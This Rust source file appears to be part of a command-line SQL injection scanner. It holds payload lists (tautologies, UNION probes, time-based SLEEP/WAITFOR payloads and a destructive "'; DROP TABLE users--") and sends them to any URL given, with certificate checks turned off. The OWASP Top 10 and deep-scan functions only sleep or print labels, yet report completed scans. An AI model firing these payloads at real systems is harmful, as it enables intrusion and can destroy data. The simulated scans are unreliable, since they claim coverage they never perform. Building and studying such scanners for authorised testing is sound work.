use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use anyhow::Result;
use crate::{Database, Config};
use std::collections::HashMap;

const SQL_PAYLOADS: &[&str] = &[
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 'x'='x",
    "' AND 1=0 UNION ALL SELECT",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "'; DROP TABLE users--",
    "1' AND '1'='1",
    "1' AND '1'='2",
];

const ERROR_SIGNATURES: &[&str] = &[
    "SQL syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "ORA-",
    "ODBC",
    "Microsoft SQL",
    "SQLServer",
    "PostgreSQL",
    "sqlite3",
    "Warning: mysql",
    "valid MySQL result",
    "MySqlClient",
    "com.mysql.jdbc",
    "SQLException",
    "Unclosed quotation",
    "syntax error",
    "database error",
];

pub async fn quick_scan(url: &str, db: &Database, config: &Config) -> Result<()> {
    println!("\n{}", format!("🎯 Quick SQL Scan: {}", url).bright_cyan().bold());
    
    let parsed_url = url::Url::parse(url)?;
    let params: HashMap<_, _> = parsed_url.query_pairs().into_owned().collect();
    
    if params.is_empty() {
        println!("{}", "⚠  No GET parameters found to test".yellow());
        return Ok(());
    }
    
    println!("{}", format!("Found {} parameters to test", params.len()).bright_yellow());
    
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(config.timeout))
        .user_agent(&config.user_agent)
        .danger_accept_invalid_certs(true)
        .build()?;
    
    let pb = ProgressBar::new((params.len() * SQL_PAYLOADS.len()) as u64);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("[{elapsed_precise}] {bar:40.cyan/blue} {pos}/{len} {msg}")
            .unwrap()
            .progress_chars("█▓▒░"),
    );
    
    let mut vulnerabilities = 0;
    
    for (param_name, param_value) in &params {
        for payload in SQL_PAYLOADS {
            pb.set_message(format!("Testing: {}={}", param_name, &payload[..10.min(payload.len())]));
            
            let mut test_params = params.clone();
            test_params.insert(param_name.clone(), format!("{}{}", param_value, payload));
            
            let mut test_url = parsed_url.clone();
            test_url.set_query(Some(&serde_urlencoded::to_string(&test_params)?));
            
            match client.get(test_url.as_str()).send().await {
                Ok(response) => {
                    let body = response.text().await.unwrap_or_default();
                    
                    for signature in ERROR_SIGNATURES {
                        if body.contains(signature) {
                            println!("\n{}", format!("🚨 VULNERABILITY FOUND!").bright_red().bold());
                            println!("  Parameter: {}", param_name.bright_yellow());
                            println!("  Payload: {}", payload.bright_magenta());
                            println!("  Error signature: {}", signature.bright_red());
                            
                            let _ = db.save_sql_scan(
                                test_url.as_str(),
                                "GET",
                                payload,
                                true,
                                signature
                            );
                            
                            vulnerabilities += 1;
                            break;
                        }
                    }
                    
                    if config.verbose {
                        let _ = db.save_sql_scan(
                            test_url.as_str(),
                            "GET",
                            payload,
                            false,
                            "No vulnerability"
                        );
                    }
                }
                Err(e) => {
                    if config.verbose {
                        println!("{}", format!("⚠  Request failed: {}", e).bright_black());
                    }
                }
            }
            
            pb.inc(1);
            tokio::time::sleep(tokio::time::Duration::from_millis(config.rate_limit)).await;
        }
    }
    
    pb.finish_with_message("Scan complete!");
    
    if vulnerabilities > 0 {
        println!("\n{}", format!("🚨 Found {} potential vulnerabilities!", vulnerabilities).bright_red().bold());
    } else {
        println!("\n{}", "✅ No vulnerabilities detected".green().bold());
    }
    
    Ok(())
}

pub async fn deep_scan(url: &str, db: &Database, config: &Config) -> Result<()> {
    println!("\n{}", format!("🚀 Deep SQL Scan: {}", url).bright_cyan().bold());
    println!("{}", "Testing GET, POST, Headers, and Cookies...".bright_yellow());
    
    // First do quick scan
    quick_scan(url, db, config).await?;
    
    // Additional deep scanning logic would go here
    println!("\n{}", "🔍 Testing POST parameters...".bright_cyan());
    println!("{}", "  ⚠  Requires form submission (simulated)".yellow());
    
    println!("\n{}", "🔍 Testing HTTP headers...".bright_cyan());
    let headers_to_test = vec!["User-Agent", "Referer", "X-Forwarded-For", "Cookie"];
    for header in headers_to_test {
        println!("  Testing header: {}", header.bright_yellow());
    }
    
    println!("\n{}", "✅ Deep scan completed!".green().bold());
    Ok(())
}

pub async fn owasp_scan(url: &str, db: &Database, config: &Config) -> Result<()> {
    println!("\n{}", format!("📋 OWASP Top 10 Full Scan: {}", url).bright_cyan().bold());
    
    let tests = vec![
        "A01: Broken Access Control",
        "A02: Cryptographic Failures",
        "A03: Injection (SQL, NoSQL, Command)",
        "A04: Insecure Design",
        "A05: Security Misconfiguration",
        "A06: Vulnerable Components",
        "A07: Authentication Failures",
        "A08: Software Integrity Failures",
        "A09: Logging Failures",
        "A10: SSRF",
    ];
    
    let pb = ProgressBar::new(tests.len() as u64);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("[{elapsed_precise}] {bar:40.cyan/blue} {pos}/{len} {msg}")
            .unwrap()
            .progress_chars("█▓▒░"),
    );
    
    for test in tests {
        pb.set_message(test.to_string());
        
        // Simulate testing
        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
        
        pb.inc(1);
    }
    
    pb.finish_with_message("OWASP scan complete!");
    
    // Run SQL injection test as part of OWASP A03
    println!("\n{}", "Running A03 Injection tests...".bright_cyan());
    quick_scan(url, db, config).await?;
    
    println!("\n{}", "✅ OWASP Top 10 scan completed!".green().bold());
    Ok(())
}

pub async fn blind_scan(url: &str, db: &Database, config: &Config) -> Result<()> {
    println!("\n{}", format!("🔬 Blind SQL Injection Test: {}", url).bright_cyan().bold());
    
    let time_based_payloads = vec![
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND BENCHMARK(5000000,MD5('A'))--",
        "'; SELECT SLEEP(5)--",
    ];
    
    let boolean_payloads = vec![
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR 1=1--",
        "' OR 1=2--",
    ];
    
    println!("\n{}", "🕐 Testing time-based blind injection...".bright_yellow());
    
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(config.timeout + 10))
        .user_agent(&config.user_agent)
        .danger_accept_invalid_certs(true)
        .build()?;
    
    for payload in time_based_payloads {
        println!("  Testing: {}", payload.bright_magenta());
        
        let start = std::time::Instant::now();
        let _ = client.get(format!("{}?id=1{}", url, payload)).send().await;
        let duration = start.elapsed();
        
        if duration.as_secs() >= 5 {
            println!("{}", format!("  🚨 Time-based blind SQL injection detected! ({}s delay)", duration.as_secs()).bright_red().bold());
            let _ = db.save_sql_scan(url, "GET", payload, true, "Time-based blind SQLi");
        }
        
        tokio::time::sleep(tokio::time::Duration::from_millis(config.rate_limit)).await;
    }
    
    println!("\n{}", "🔍 Testing boolean-based blind injection...".bright_yellow());
    
    for payload in boolean_payloads {
        println!("  Testing: {}", payload.bright_magenta());
        
        let response = client.get(format!("{}?id=1{}", url, payload)).send().await?;
        let body = response.text().await?;
        
        // Simple heuristic: check response length differences
        println!("  Response length: {} bytes", body.len());
        
        tokio::time::sleep(tokio::time::Duration::from_millis(config.rate_limit)).await;
    }
    
    println!("\n{}", "✅ Blind SQL injection test completed!".green().bold());
    Ok(())
}

pub async fn custom_scan(url: &str, payload: &str, db: &Database, config: &Config) -> Result<()> {
    println!("\n{}", format!("💉 Custom Payload Injection: {}", url).bright_cyan().bold());
    println!("Payload: {}", payload.bright_magenta());
    
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(config.timeout))
        .user_agent(&config.user_agent)
        .danger_accept_invalid_certs(true)
        .build()?;
    
    let test_url = format!("{}?id={}", url, urlencoding::encode(payload));
    
    match client.get(&test_url).send().await {
        Ok(response) => {
            let status = response.status();
            let body = response.text().await?;
            
            println!("\n{}", "📊 Response Details:".bright_yellow().bold());
            println!("  Status: {}", status);
            println!("  Body length: {} bytes", body.len());
            
            let mut vulnerable = false;
            for signature in ERROR_SIGNATURES {
                if body.contains(signature) {
                    println!("\n{}", "🚨 SQL ERROR DETECTED!".bright_red().bold());
                    println!("  Signature: {}", signature.bright_red());
                    vulnerable = true;
                    break;
                }
            }
            
            let _ = db.save_sql_scan(
                &test_url,
                "GET",
                payload,
                vulnerable,
                if vulnerable { "Error detected" } else { "No error" }
            );
            
            if vulnerable {
                println!("\n{}", "🚨 Potential vulnerability detected!".bright_red().bold());
            } else {
                println!("\n{}", "✅ No obvious vulnerability".green().bold());
            }
        }
        Err(e) => {
            println!("{}", format!("⚠  Request failed: {}", e).yellow());
        }
    }
    
    Ok(())
}

pub async fn view_history(db: &Database) -> Result<()> {
    println!("\n{}", "📊 Scan History:".bright_cyan().bold());
    println!("{}", "Feature coming soon - check the database directly".bright_yellow());
    Ok(())
}
